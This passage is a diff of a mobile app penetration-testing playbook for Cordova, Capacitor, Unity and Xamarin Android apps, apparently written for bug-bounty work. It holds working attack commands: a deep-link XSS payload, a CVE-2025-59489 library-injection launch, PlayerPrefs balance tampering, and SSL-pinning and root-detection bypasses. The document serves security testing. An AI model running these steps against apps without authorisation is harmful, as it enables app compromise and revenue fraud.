 - **Proof:** A plugin listed with `onload="true"` whose `pluginInitialize()` performs network or file activity
   before any user interaction, confirmed with `frida-trace`/`strace` at launch.
@@ -2262,12 +2334,12 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   are not.
 - **How:**
   ```bash
-  jadx -d out target.apk
-  grep -rn '@PluginMethod\|@CapacitorPlugin\|extends Plugin\b' out/sources | head -60
-  grep -rn 'extends CordovaPlugin' out/sources | head -40
-  grep -rn 'public boolean execute(' out/sources -A10 | head -60      # Cordova plugin entry point
-  grep -rn '@Permission(' out/sources | head                          # what each plugin declares
-  unzip -p target.apk assets/www/cordova_plugins.js | head -60
+  # decompiled by P2 into $DEC/jadx/sources
+  grep -rn '@PluginMethod\|@CapacitorPlugin\|extends Plugin\b' $DEC/jadx/sources | head -60
+  grep -rn 'extends CordovaPlugin' $DEC/jadx/sources | head -40
+  grep -rn 'public boolean execute(' $DEC/jadx/sources -A10 | head -60      # Cordova plugin entry point
+  grep -rn '@Permission(' $DEC/jadx/sources | head                          # what each plugin declares
+  unzip -p "$E"/apk/base.apk assets/www/cordova_plugins.js | head -60
   ```
   For each, note the parameter names and then call it:
   ```javascript
@@ -2303,15 +2375,14 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **How:**
   ```bash
   grep -rnE 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function\(|dangerouslySetInnerHTML|\[innerHTML\]|bypassSecurityTrust' \
-    out/assets/{www,public} 2>/dev/null | head -60
-  grep -rnE 'addEventListener\(\s*["'\'']message' out/assets/{www,public} 2>/dev/null | head
-  grep -rnE 'location\.(hash|search|href)|URLSearchParams|params\[' out/assets/{www,public} 2>/dev/null | head -40
-  grep -rniE 'DISPLAY_NAME|filename|displayName|getLastPathSegment' out/assets/{www,public} 2>/dev/null
-  grep -rniE 'resume|onResume|visibilitychange|refresh|exists|deleted' out/assets/{www,public} 2>/dev/null
-  grep -rn 'appUrlOpen\|handleOpenURL\|window\.location' out/assets/{www,public} 2>/dev/null | head
+    $DEC/apktool/assets/{www,public} 2>/dev/null | head -60
+  grep -rnE 'addEventListener\(\s*["'\'']message' $DEC/apktool/assets/{www,public} 2>/dev/null | head
+  grep -rnE 'location\.(hash|search|href)|URLSearchParams|params\[' $DEC/apktool/assets/{www,public} 2>/dev/null | head -40
+  grep -rniE 'DISPLAY_NAME|filename|displayName|getLastPathSegment' $DEC/apktool/assets/{www,public} 2>/dev/null
+  grep -rniE 'resume|onResume|visibilitychange|refresh|exists|deleted' $DEC/apktool/assets/{www,public} 2>/dev/null
+  grep -rn 'appUrlOpen\|handleOpenURL\|window\.location' $DEC/apktool/assets/{www,public} 2>/dev/null | head
   # drive a sink through the deep-link / appUrlOpen path:
-  adb shell am start -a android.intent.action.VIEW \
-    -d "<scheme>://x#<img src=x onerror=alert(typeof androidBridge)>" <pkg>
+  adb -s "$SERIAL" shell 'am start -a android.intent.action.VIEW -d "<scheme>://x%23%3Cimg%20src=x%20onerror=alert(typeof%20androidBridge)%3E" <pkg>'   # single-quoted + %-encoded; # must be %23 or the fragment is lost before am sees it
   ```
   Trace filename, title, label, MIME and URI-derived fields **backwards** to their source — second-order
   sinks (a filename rendered later on a list screen) are the productive ones here.
@@ -2341,7 +2412,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   missing `connect-src`.
 - **How:**
   ```bash
-  grep -n 'Content-Security-Policy' out/assets/www/index.html out/assets/public/index.html 2>/dev/null
+  grep -n 'Content-Security-Policy' $DEC/apktool/assets/www/index.html $DEC/apktool/assets/public/index.html 2>/dev/null
   # absent is the finding; weak looks like:
   #   default-src *; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval'
   ```
@@ -2359,38 +2430,42 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (null); the chained outcome via the bridge is `broken_authentication_and_session_management.authentication_bypass` (P1) |
+| **VRT** | `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (varies); the chained outcome via the bridge is `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-11 physical unlocked, or anyone with ADB access to the device |
 | **Applies to** | Cordova, Capacitor and React Native WebViews |
 | **Requires** | webview, device, cordova, capacitor, react-native |
 | **Maps to** | Capacitor `Bridge.java` (`WebView.setWebContentsDebuggingEnabled(this.config.isWebContentsDebuggingEnabled())`) and `CapConfig.java` (`android.webContentsDebuggingEnabled`, defaulting to `isDebug`); Cordova `SystemWebViewEngine.java` (`preferences.getString("InspectableWebview", null)` -> `WebView.setWebContentsDebuggingEnabled(true)`); `RNCWebViewManager.kt` (`RNCWebView.setWebContentsDebuggingEnabled(value)`) |
 
-- **Test:** All three WebView frameworks expose a switch that enables remote debugging. In a release build
+- **Test:** (This item keeps only the framework config keys; D10-049 owns the generic `setWebContentsDebuggingEnabled` proof and rule-out; D21-048 defers to it and D02-032 restates it.) All three WebView frameworks expose a switch that enables remote debugging. In a release build
   this hands anyone with ADB a full JS console in the bridged origin — which, given D19-049/D19-051, is the
   whole app sandbox.
 - **How:**
   ```bash
-  grep -n '"webContentsDebuggingEnabled"' out/assets/capacitor.config.json
-  grep -nE '<preference name="InspectableWebview"' out/res/xml/config.xml
-  grep -a -n 'setWebContentsDebuggingEnabled' hbc.strings out/sources 2>/dev/null
-  adb shell cat /proc/net/unix | grep -i webview_devtools
-  # then open chrome://inspect and confirm the app's WebView is listed
+  grep -n '"webContentsDebuggingEnabled"' $DEC/apktool/assets/capacitor.config.json
+  grep -nE '<preference name="InspectableWebview"' $DEC/apktool/res/xml/config.xml
+  grep -a -n 'setWebContentsDebuggingEnabled' hbc.strings $DEC/jadx/sources 2>/dev/null
+  adb -s "$SERIAL" shell getprop ro.build.type                                  # user | userdebug — the socket test is only meaningful on 'user'
+  adb -s "$SERIAL" shell cat /proc/net/unix | grep -c webview_devtools_remote    # on a userdebug/emulator build this is non-zero for EVERY WebView process
+  # control: an uninstrumented comparison app that uses a WebView must NOT show a socket on a user build
+  # then open chrome://inspect and confirm the app's WebView is listed (generic proof and rule-out: D10-049)
   ```
 - **Proof:** The WebView appearing in `chrome://inspect` for a **release-signed** build (prove the signature
   with `apksigner verify --print-certs`), and from that console `typeof androidBridge` / `typeof _cordovaNative`
   / `typeof window.ReactNativeWebView` returning `object`.
 - **Escalation:** Combined with any bridge primitive this is local full-data compromise without root ->
   D19-049, D19-051, D19-052. If the bridge is absent it falls to Medium.
-- **Ruled out when:** The preference is absent or explicitly `false`, no `webview_devtools_remote_` socket
-  appears in `/proc/net/unix` while the app runs, and `chrome://inspect` lists nothing for the package. Test
-  on the release build, not a debug build.
+- **Ruled out when:** The config value is absent or explicitly `false` **and**, on a `ro.build.type=user` device,
+  `chrome://inspect` lists nothing for the package while an uninstrumented comparison WebView app is open. On a
+  userdebug/emulator build the devtools socket exists for every WebView process and is not evidence either way —
+  settle the item from the shipped config plus a user-build `chrome://inspect` check, or mark it
+  `blocked: needs user build`. Test the release build, not a debug build; D10-049 owns the generic proof.
 
 ### D19-059 · Capacitor's native HTTP path silently skipping pinning
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `insecure_data_transport.cleartext_transmission_of_sensitive_data` (null) where the excluded host carries authentication material; the filed finding is what the intercepted traffic exposes |
+| **VRT** | `insecure_data_transport.cleartext_transmission_of_sensitive_data` (varies) where the excluded host carries authentication material; the filed finding is what the intercepted traffic exposes |
 | **Attacker** | AM-06 network attacker |
 | **Applies to** | Capacitor Android with CapacitorHttp |
 | **Requires** | capacitor, webview, mitm |
@@ -2401,8 +2476,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   headers the page supplied — so the app's own "we pin" claim is true for some hosts and false for others.
 - **How:**
   ```bash
-  python3 -c "import json;print(json.load(open('out/assets/capacitor.config.json')).get('plugins',{}))"
-  grep -rn 'isDomainExcludedFromSSL\|danger\|acceptAllCerts\|sslPinning' out/sources out/assets/{www,public} 2>/dev/null | head
+  python3 -c "import json;print(json.load(open('$DEC/apktool/assets/capacitor.config.json')).get('plugins',{}))"
+  grep -rn 'isDomainExcludedFromSSL\|danger\|acceptAllCerts\|sslPinning' $DEC/jadx/sources $DEC/apktool/assets/{www,public} 2>/dev/null | head
   ```
 - **Proof:** A configured SSL-exclusion entry, plus successful interception of that host's traffic while other
   hosts stay pinned — show both sides of the comparison.
@@ -2428,9 +2503,10 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   script into the bridge origin, and a low `minWebViewVersion` admits an unpatched WebView.
 - **How:**
   ```bash
-  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(d.get('server',{}));print(d.get('android',{}))"
-  grep -nE '<preference name="(scheme|hostname|AndroidInsecureFileModeEnabled)"' out/res/xml/config.xml
-  adb shell dumpsys package com.google.android.webview | grep versionName
+  python3 -c "import json;d=json.load(open('$DEC/apktool/assets/capacitor.config.json'));print(d.get('server',{}));print(d.get('android',{}))"
+  python3 -c "import json;print(json.load(open('$DEC/apktool/assets/capacitor.config.json')).get('server',{}).get('allowNavigation'))"   # a wildcard widens the bridge's allowed origins -> D19-084
+  grep -nE '<preference name="(scheme|hostname|AndroidInsecureFileModeEnabled)"' $DEC/apktool/res/xml/config.xml
+  adb -s "$SERIAL" shell dumpsys package com.google.android.webview | grep versionName
   # confirm the effective origin from inside the WebView:
   #   console: location.origin
   ```
@@ -2450,7 +2526,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Severity ceiling** | Support |
 | **VRT** | n/a as recon; `lack_of_binary_hardening.lack_of_obfuscation` (**P5**) if filed as a finding — do not |
 | **Attacker** | n/a |
-| **Applies to** | Unity IL2CPP Android builds. Il2CppDumper supports Unity **5.3–2022.2**; frida-il2cpp-bridge covers **5.3.0–6000.3.x**. Mono-backend builds instead ship managed `.dll` assemblies under `assets/bin/Data/Managed/` and are directly ILSpy-able |
+| **Applies to** | Unity IL2CPP Android builds. Il2CppDumper's README range is Unity **5.3–2022.2** (last release 2023) — for 2023.x/6000.x metadata (version ≥ 31) use Il2CppInspectorRedux or the runtime dump in D19-062; frida-il2cpp-bridge covers **5.3.0–6000.3.x**. Mono-backend builds instead ship managed `.dll` assemblies under `assets/bin/Data/Managed/` and are directly ILSpy-able |
 | **Requires** | unity, native, device, root |
 | **Maps to** | Il2CppDumper README (outputs `DummyDll/`, `dump.cs`, `script.json`, `il2cpp.h`, `stringliteral.json`, `ida.py`, `ida_with_struct.py`, `ghidra.py`, `ghidra_wasm.py`, `Il2CppBinaryNinja`); frida-il2cpp-bridge README; MASTG-TECH-0165 |
 
@@ -2459,29 +2535,34 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   anti-cheat logic lives. Raw `libil2cpp.so` has no symbols, so without this step the binary is unreadable.
 - **How:**
   ```bash
-  unzip -o target.apk 'assets/bin/Data/Managed/Metadata/global-metadata.dat' 'lib/arm64-v8a/libil2cpp.so' -d ext/
-  xxd -l 8 ext/assets/bin/Data/Managed/Metadata/global-metadata.dat     # expect AF 1B B1 FA -> 0xFAB11BAF
-  Il2CppDumper.exe ext/lib/arm64-v8a/libil2cpp.so \
-                   ext/assets/bin/Data/Managed/Metadata/global-metadata.dat ./out
-  ls out/
-  grep -nE 'IsPremium|Entitlement|Purchase|Verify|Licen[cs]e|Token|Secret' out/dump.cs | head -50
-  grep -n '"Addresses"\|"ScriptMethod"\|"ScriptString"' out/script.json | head
+  for f in "$E"/apk/*.apk; do unzip -oq "$f" 'assets/bin/Data/Managed/Metadata/global-metadata.dat' 'lib/arm64-v8a/libil2cpp.so' -d "$DEC/raw/"; done
+  xxd -l 8 $DEC/raw/assets/bin/Data/Managed/Metadata/global-metadata.dat     # expect AF 1B B1 FA -> 0xFAB11BAF
+  strings "$DEC/raw/lib/arm64-v8a/libunity.so" | grep -m1 -E '^(20[0-9]{2}|6000)\.[0-9]+\.[0-9]+[abfp][0-9]+'   # Unity version first: it decides the tool
+  # Il2CppDumper release zips ship linux-x64 / osx-x64 / win-x64 builds: call the native binary (or `dotnet Il2CppDumper.dll`), never the .exe
+  Il2CppDumper "$DEC/raw/lib/arm64-v8a/libil2cpp.so" \
+               "$DEC/raw/assets/bin/Data/Managed/Metadata/global-metadata.dat" "$DEC/il2cpp"
+  # Unity 2023.x / 6000.x metadata (version >= 31): Il2CppDumper's range ends at 2022.2 — use Il2CppInspectorRedux instead
+  Il2CppInspector.CLI --bin "$DEC/raw/lib/arm64-v8a/libil2cpp.so" --metadata "$DEC/raw/assets/bin/Data/Managed/Metadata/global-metadata.dat" -o "$DEC/il2cpp"
+  ls "$DEC/il2cpp/"
+  grep -nE 'IsPremium|Entitlement|Purchase|Verify|Licen[cs]e|Token|Secret' "$DEC/il2cpp/dump.cs" | head -50
+  grep -n '"Addresses"\|"ScriptMethod"\|"ScriptString"' "$DEC/il2cpp/script.json" | head
   # restore symbols in the disassembler:
   #   IDA:    File > Script file... > ida_with_struct.py, pointed at script.json and il2cpp.h
   #   Ghidra: Script Manager > ghidra.py   (ghidra_wasm.py for WASM targets, with ghidra-wasm-plugin)
   # Mono backend instead:
-  ls ext/assets/bin/Data/Managed/Assembly-CSharp.dll && ilspycmd ext/assets/bin/Data/Managed/Assembly-CSharp.dll | head -40
+  ls $DEC/raw/assets/bin/Data/Managed/Assembly-CSharp.dll && ilspycmd $DEC/raw/assets/bin/Data/Managed/Assembly-CSharp.dll | head -40
   ```
 - **Proof:** `dump.cs` containing real namespaced classes with method RVAs, `DummyDll/*.dll` loading in
   dnSpy/ILSpy, and named functions appearing in the disassembler at the addresses `dump.cs` lists.
 - **Escalation:** Feeds D19-063 (entitlement logic), D19-064 (PlayerPrefs call sites), D19-037 (keys in the
   blob), D19-011 (endpoints), and the crypto read below.
   ```bash
-  grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String' out/dump.cs | head -60
+  grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String' "$DEC/il2cpp/dump.cs" | head -60
   ```
 - **Ruled out when:** The app is Mono-backend (no `libil2cpp.so`), in which case read the managed assemblies
   directly and skip this item. `ERROR: Metadata file supplied is not valid metadata file.` is **not** a
-  rule-out — go to D19-062.
+  rule-out: on a 2023+/6000 build it is a tool-range failure, not protection — try the maintained tool first,
+  then go to D19-062 for genuinely encrypted or rewritten metadata.
 
 ### D19-062 · Unity: defeat encrypted, renamed or relocated `global-metadata.dat`
 
@@ -2500,16 +2581,16 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   ```bash
   xxd -l 8 assets/bin/Data/Managed/Metadata/global-metadata.dat     # AF 1B B1 FA = 0xFAB11BAF sanity value
   # 1) hunt a renamed or relocated file anywhere in the package:
-  for f in $(unzip -l target.apk | awk '{print $4}'); do
-    unzip -p target.apk "$f" 2>/dev/null | head -c 4 | xxd -p | grep -q 'af1bb1fa' && echo "METADATA: $f"; done
+  for f in $(unzip -Z1 "$E"/apk/base.apk); do
+    unzip -p "$E"/apk/base.apk "$f" 2>/dev/null | head -c 4 | xxd -p | grep -q 'af1bb1fa' && echo "METADATA: $f"; done
   # 2) find the loader statically:
   #    strings -> "global-metadata.dat" -> xrefs -> MetadataCache::Initialize -> MetadataLoader::LoadMetadataFile
   #    waypoint: the "4.0" framework-version string marks Runtime::Init
   # 3) runtime recovery (preferred — metadata-free):
   npm exec frida-il2cpp-bridge -- -f <pkg> dump --out-dir dumps
   # or Zygisk-Il2CppDumper (Magisk v24+ / Zygisk), then:
-  adb shell su -c 'ls -l /data/data/<pkg>/files/dump.cs'
-  adb shell su -c 'cat /data/data/<pkg>/files/dump.cs' > dump.cs
+  adb -s "$SERIAL" shell su -c 'ls -l /data/data/<pkg>/files/dump.cs'
+  adb -s "$SERIAL" shell su -c 'cat /data/data/<pkg>/files/dump.cs' > dump.cs
   ```
 - **Proof:** A `dump.cs` with real class and method names produced despite the on-disk metadata being
   unreadable — quote a first-party namespace from it.
@@ -2524,8 +2605,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.privilege_escalation` (null — rated on the entitlement obtained); Critical where it produces direct revenue loss |
-| **Attacker** | AM-12 own device for the manipulation; the impact is on the vendor |
+| **VRT** | `broken_access_control.privilege_escalation` (varies — rated on the entitlement obtained); Critical where it produces direct revenue loss |
+| **Attacker** | AM-01 once the backend accepts the manipulated state (AM-12 to set up, on the attacker's own device); the impact is on the vendor |
 | **Applies to** | Unity IL2CPP Android |
 | **Requires** | unity, device, frida, backend-api |
 | **Maps to** | frida-il2cpp-bridge README (trace/intercept/replace method calls; `dump` subcommand); Il2CppDumper README (`dump.cs` with method/field/property information) |
@@ -2535,9 +2616,9 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   accepts the resulting state.
 - **How:**
   ```bash
-  grep -nE 'class .*(Purchase|Shop|Store|Entitlement|Inventory|Wallet|Subscription|IAP)' out/dump.cs | head
-  grep -nE '(bool|void) +(Is|Has|Grant|Unlock|Add)[A-Za-z]*\(' out/dump.cs | head -60
-  grep -aiE 'react-native-iap|in_app_purchase|BillingClient|purchaseToken|acknowledgePurchase|consumePurchase' out/dump.cs | head
+  grep -nE 'class .*(Purchase|Shop|Store|Entitlement|Inventory|Wallet|Subscription|IAP)' "$DEC/il2cpp/dump.cs" | head
+  grep -nE '(bool|void) +(Is|Has|Grant|Unlock|Add)[A-Za-z]*\(' "$DEC/il2cpp/dump.cs" | head -60
+  grep -aiE 'react-native-iap|in_app_purchase|BillingClient|purchaseToken|acknowledgePurchase|consumePurchase' "$DEC/il2cpp/dump.cs" | head
   ```
   ```javascript
   // frida-il2cpp-bridge
@@ -2568,8 +2649,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.privilege_escalation` (null) when the server accepts the edited value; `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5**) if filed as a storage issue — do not |
-| **Attacker** | AM-12 own device |
+| **VRT** | `broken_access_control.privilege_escalation` (varies) when the server accepts the edited value; `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5**) if filed as a storage issue — do not |
+| **Attacker** | AM-01 when the backend trusts the edited state (AM-12 to observe and edit, on the attacker's own device) |
 | **Applies to** | Unity Android |
 | **Requires** | unity, device |
 | **Maps to** | Il2CppDumper `dump.cs` (used to locate the `PlayerPrefs` call sites) |
@@ -2578,11 +2659,14 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   `Application.persistentDataPath`, then trust the value on load.
 - **How:**
   ```bash
-  grep -nE 'PlayerPrefs\.(Set|Get)(Int|Float|String)|persistentDataPath' out/dump.cs | head -40
-  adb shell "run-as <pkg> ls -la shared_prefs/ files/"
-  adb shell "run-as <pkg> cat shared_prefs/<pkg>.v2.playerprefs.xml"
-  adb shell "run-as <pkg> sh -c 'sed -i s/\"coins\">100</\"coins\">999999</ shared_prefs/<pkg>.v2.playerprefs.xml'"
-  adb shell am force-stop <pkg> && adb shell monkey -p <pkg> 1
+  grep -nE 'PlayerPrefs\.(Set|Get)(Int|Float|String)|persistentDataPath' "$DEC/il2cpp/dump.cs" | head -40
+  adb -s "$SERIAL" shell "run-as <pkg> ls -la shared_prefs/ files/"
+  adb -s "$SERIAL" shell "run-as <pkg> cat shared_prefs/<pkg>.v2.playerprefs.xml"
+  # edit on the host (an in-place sed inside adb -s "$SERIAL" shell "..." is re-parsed by the device sh: < > become redirections):
+  adb -s "$SERIAL" exec-out run-as <pkg> cat shared_prefs/<pkg>.v2.playerprefs.xml > pp.xml
+  sed 's/"coins">100</"coins">999999</' pp.xml > pp2.xml && adb -s "$SERIAL" push pp2.xml /data/local/tmp/
+  adb -s "$SERIAL" shell 'run-as <pkg> cp /data/local/tmp/pp2.xml shared_prefs/<pkg>.v2.playerprefs.xml'   # su -c variant on the rooted AVD for a non-debuggable release build
+  adb -s "$SERIAL" shell am force-stop <pkg> && adb -s "$SERIAL" shell monkey -p <pkg> 1
   ```
 - **Proof:** The modified value reflected in the UI after relaunch **and** accepted by the server — a
   purchase, redeem or leaderboard call succeeding with the inflated balance, shown in the proxy.
@@ -2595,7 +2679,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the CLI-extras library-load path; `broken_access_control.exposed_sensitive_android_intent` (null) for the general extras case |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the CLI-extras library-load path; `broken_access_control.exposed_sensitive_android_intent` (varies) for the general extras case |
 | **Attacker** | AM-03 zero-permission local app |
 | **Applies to** | Unity Android apps exporting `UnityPlayerActivity` / `UnityPlayerGameActivity`. Note the `targetSdk<31` gate — with an intent-filter present, exported is the default |
 | **Requires** | unity, exported-activity |
@@ -2606,14 +2690,17 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   deep-link payloads, promo codes, debug flags — via `AndroidJavaObject` calls from C#.
 - **How:**
   ```bash
-  grep -n -A15 'com.unity3d.player' out/AndroidManifest.xml
-  apkanalyzer manifest print target.apk | grep -i "UnityPlayerActivity\|UnityPlayerGameActivity"
-  adb shell dumpsys package <pkg> | sed -n '/Activity Resolver Table/,/Service Resolver/p'
-  grep -nE 'getIntent|AndroidJavaObject|currentActivity|getStringExtra' out/dump.cs | head -40
+  grep -n -A15 'com.unity3d.player' $DEC/apktool/AndroidManifest.xml
+  apkanalyzer manifest print "$E"/apk/base.apk | grep -i "UnityPlayerActivity\|UnityPlayerGameActivity"
+  adb -s "$SERIAL" shell dumpsys package <pkg> | sed -n '/Activity Resolver Table/,/Service Resolver/p'
+  grep -nE 'getIntent|AndroidJavaObject|currentActivity|getStringExtra' "$DEC/il2cpp/dump.cs" | head -40
   # generic extras:
-  adb shell am start -n <pkg>/com.unity3d.player.UnityPlayerActivity --es <extra> "<value>"
-  # the CLI-extras bridge (CVE-2025-59489):
-  adb shell am start -n <pkg>/com.unity3d.player.UnityPlayerActivity -e unity "-xrsdk-pre-init-library /path/to/lib.so"
+  adb -s "$SERIAL" shell am start -n <pkg>/com.unity3d.player.UnityPlayerActivity --es <extra> "<value>"
+  # the CLI-extras bridge (CVE-2025-59489). The library must live where the VICTIM uid can read+map it: the probe
+  # app's own nativeLibraryDir is world-readable; /data/local/tmp is not an AM-03 path on modern Android
+  LIB=$(adb -s "$SERIAL" shell pm dump <probe-pkg> | grep -m1 -oE 'legacyNativeLibraryDir=.*' | cut -d= -f2)/arm64/libpoc.so
+  adb -s "$SERIAL" shell 'am start -n <pkg>/com.unity3d.player.UnityPlayerActivity -e unity "-xrsdk-pre-init-library '"$LIB"'"'   # shell demo only; the AM-03 proof is the probe app issuing the same Intent
+  strings "$DEC/raw/lib/arm64-v8a/libunity.so" | grep -m1 -E '^(20[0-9]{2}|6000)\.[0-9]+\.[0-9]+[abfp][0-9]+'   # engine version for the per-stream patch table in the vendor advisory
   ```
 - **Proof:** For the extras case, `dump.cs` showing the C# method that reads the extra plus an observable
   behaviour change on device. For CVE-2025-59489, your library's constructor executing inside the target
@@ -2621,9 +2708,10 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **Escalation:** -> D08 for the intent-injection mechanics; a debug/cheat flag reaching a server-trusted
   value -> D19-063/D23. Also check the Unity engine version against known engine CVEs and against the FreeType
   bundling table (CVE-2025-27363) -> D16/D17.
-- **Ruled out when:** No Unity player activity is exported in `dumpsys package`, or the engine version is at
-  or above the patched line for CVE-2025-59489 and the library-load extra is ignored (show the launch with no
-  `dlopen` in a `frida-trace -i "dlopen*"` capture).
+- **Ruled out when:** No Unity player activity is exported in `dumpsys package`, or the version read from
+  `libunity.so` is at or above the patched release for its stream in the vendor advisory **and** the launch with
+  the probe's library shows no `dlopen` of it
+  (`frida-trace -D "$SERIAL" -f <pkg> -i 'dlopen*' -i 'android_dlopen_ext'`).
 
 ### D19-066 · Xamarin / .NET MAUI: extract the assemblies — the layout changed at .NET 9
 
@@ -2642,14 +2730,14 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   usually JIT with IL present and decompilable; full AOT requires Enterprise licensing and changes the game.
 - **How:**
   ```bash
-  unzip -l target.apk | grep -E 'assemblies|libmonosgen|libassemblies|libxamarin-app|libaot-|libmonodroid'
+  grep -E 'assemblies|libmonosgen|libassemblies|libxamarin-app|libaot-|libmonodroid|libcoreclr|libclrjit' "$E/logs/D19-001-apklist.txt"   # libcoreclr.so => CoreCLR (.NET 10+ opt-in): no mono_* API, D19-067's trace is empty by design
   # (A) Classic Xamarin / .NET <= 8
-  apktool d target.apk -o out/
-  pyxamstore unpack -d out/unknown/assemblies/       # auto-decompresses LZ4 "XALZ" entries
-  ls out/assemblies/out/*.dll
+  # decompiled by P2 into $DEC ($DEC/apktool, $DEC/jadx/sources); $DEC/raw holds the unpacked splits
+  mkdir -p "$DEC/assemblies" && (cd "$DEC/assemblies" && pyxamstore unpack -d "$DEC/apktool/unknown/assemblies/")   # auto-decompresses LZ4 "XALZ" entries; writes ./out/ in the working directory
+  ls "$DEC/assemblies/out/"*.dll
   # (B) .NET MAUI 9+
-  llvm-readelf -S ext/lib/arm64-v8a/libassemblies.arm64-v8a.blob.so | grep -i payload
-  llvm-objcopy --dump-section=payload=payload.bin ext/lib/arm64-v8a/libassemblies.arm64-v8a.blob.so
+  llvm-readelf -S $DEC/raw/lib/arm64-v8a/libassemblies.arm64-v8a.blob.so | grep -i payload
+  llvm-objcopy --dump-section=payload=payload.bin $DEC/raw/lib/arm64-v8a/libassemblies.arm64-v8a.blob.so
   xxd -l 20 payload.bin        # 58 41 42 41 = "XABA", then version, entry_count, index_entry_count, index_size
   python3 - <<'PY'
   import struct, lz4.block
@@ -2688,7 +2776,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Attacker** | AM-01 for the key; AM-06/AM-07 for the traffic |
 | **Applies to** | Xamarin.Android, .NET MAUI |
 | **Requires** | xamarin, native, device, frida |
-| **Maps to** | Appknox Xamarin guide (`ServicePointManager.ServerCertificateValidationCallback`; Fridax as "primary tool for runtime Xamarin hooking"; the `xamarin-unpin` Frida script); `@Gand3lf/xamarin-antiroot` ("Bypass antiroot detection for Xamarin apps!") |
+| **Maps to** | Appknox Xamarin guide (`ServicePointManager.ServerCertificateValidationCallback`; Fridax as "primary tool for runtime Xamarin hooking" — **LEGACY**, unmaintained since ~2020, may not load against current Mono builds; the `xamarin-unpin` Frida script); `@Gand3lf/xamarin-antiroot` ("Bypass antiroot detection for Xamarin apps!") |
 
 - **Test:** .NET apps pin, root-check and encrypt in managed code, typically via
   `ServicePointManager.ServerCertificateValidationCallback` or an `HttpClientHandler`. Standard
@@ -2696,15 +2784,16 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   a Xamarin-aware layer. Crypto here is plain C#, which is the fastest hardcoded-key path in any framework.
 - **How:**
   ```bash
-  for f in out/assemblies/out/*.dll; do ilspycmd "$f"; done > all.cs
+  for f in "$DEC/assemblies/out/"*.dll; do ilspycmd "$f"; done > all.cs
   grep -nE 'ServerCertificateValidationCallback|ServerCertificateCustomValidationCallback|HttpClientHandler' all.cs | head
   grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String' all.cs | head -40
   grep -nE 'IsJailBroken|isRooted|RootBeer|checkRoot|SafetyNet|PlayIntegrity|isEmulator' all.cs | head
   grep -nE 'GetInstallerPackageName|signatures|PackageInfo' all.cs | head
   # runtime:
-  frida-trace -U -f <pkg> -i "mono_*"          # surface the Mono API in use
-  frida -D "$SERIAL" -f <pkg> -l fridax.js    # Fridax, for managed-method hooking
-  frida --codeshare <xamarin-unpin script> -U -f <pkg>
+  nm -D "$DEC/raw/lib/arm64-v8a/libmonosgen-2.0.so" 2>/dev/null | grep -c ' mono_'     # Mono: >0 ; CoreCLR build (.NET 10+): file absent
+  frida-trace -D "$SERIAL" -f <pkg> -i 'mono_runtime_invoke' -i 'mono_method_get_name'   # Mono only; print method names from onEnter via mono_method_get_name
+  frida -D "$SERIAL" --codeshare <xamarin-unpin script> -f <pkg> -q -t 120            # Mono only
+  # CoreCLR builds: no public managed-hook tooling — settle the item statically (ilspycmd output + the D19-068 IL patch) and mark the runtime half 'blocked: CoreCLR runtime'
   ```
 - **Proof:** For crypto, a literal key/IV byte array in the decompiled source plus a successful offline
   decryption of the app's stored data with it. For pinning, the managed callback's arguments and return value
@@ -2715,7 +2804,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **Ruled out when:** No validation callback is overridden (pinning is delegated to the platform), the crypto
   derives its key from a Keystore-backed or server-issued source, and the root check is implemented natively.
   Show the Mono trace confirming the callback is not invoked, rather than concluding it from the absence of a
-  grep hit — obfuscated assemblies rename methods.
+  grep hit — obfuscated assemblies rename methods. On a CoreCLR build the IL-patch path (D19-068) is the proof
